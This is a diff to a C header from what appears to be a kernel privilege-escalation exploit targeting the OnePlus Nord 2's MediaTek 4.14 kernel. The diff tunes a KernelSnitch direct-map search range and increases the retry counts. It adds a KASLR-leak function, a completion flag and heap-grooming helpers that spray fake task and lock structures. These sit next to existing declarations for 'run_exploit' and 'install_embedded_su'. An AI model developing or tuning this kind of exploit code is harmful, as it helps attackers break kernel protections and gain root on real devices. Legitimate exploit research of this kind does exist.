@@ -5,13 +5,15 @@
 #define __ARM 1
 
 /* CRITICAL: Define these BEFORE including kernelsnitch headers
- * to override the default calculation which limits to 64GB
+ * OnePlus Nord 2 has ~1GB RAM at physical 0x40000000-0x77e4ffff
+ * Direct map = 0xffffff8000000000 + physical
+ * So actual range: 0xffffff8040000000 - 0xffffff8077e4ffff
  */
 #ifndef KERNELSNITCH_IDENTITY_START
-#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
+#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL  // Start of direct map
 #endif
 #ifndef KERNELSNITCH_IDENTITY_END
-#define KERNELSNITCH_IDENTITY_END 0xffffffc000000000ULL
+#define KERNELSNITCH_IDENTITY_END    0xffffff8010000000ULL  // 256MB search (faster)
 #endif
 
 #include "offset.h"
@@ -48,15 +50,15 @@
 
 #include "kernelsnitch/utils.h"
 
-#define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 12
-#define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 72
+#define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 50
+#define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 200
 #define SKB_DATA_DELTA (-0xe80LL)
 
 #define MM_STRUCT_SZ 0x380   /* Nord 2 k4.14: sizeof(mm_struct) = 896 bytes from /proc/slabinfo */
 #define MM_ORDER 3           /* TODO: 5.10 mm_cachep の slab order を要確認（grooming, Gap D） */
 #define MM_PARTIALS 5
 #define CORE 0
-#define KSNITCH_COLLISIONS 8  /* Increased for MediaTek 4.14 */
+#define KSNITCH_COLLISIONS 8  /* Higher value for MediaTek 4.14 kernel */
 
 #define DIRECT_MAP_BASE P0_PAGE_OFFSET
 #define DIRECT_MAP_END 0xffffffc000000000ULL
@@ -157,6 +159,7 @@ extern atomic_int main_route_delay_usec;
 
 extern uint64_t kaslr_base;
 extern uint64_t kaslr_slide;
+extern int kaslr_done;
 
 int run_exploit(int argc, char **argv);
 int install_embedded_su(pid_t *daemon_pid);
@@ -215,4 +218,9 @@ int direct_pselect_write_followup_once(
     uintptr_t target, uintptr_t value, int shape, int idx,
     uintptr_t followup_target, int followup_idx);
 
+// Key grooming functions
+int drain_freelist(uintptr_t fake_task, uintptr_t fake_lock);
+int spray_reclaim_key(uintptr_t fake_task, uintptr_t fake_lock);
+
 #endif
+uint64_t perf_leak_text_base(void);
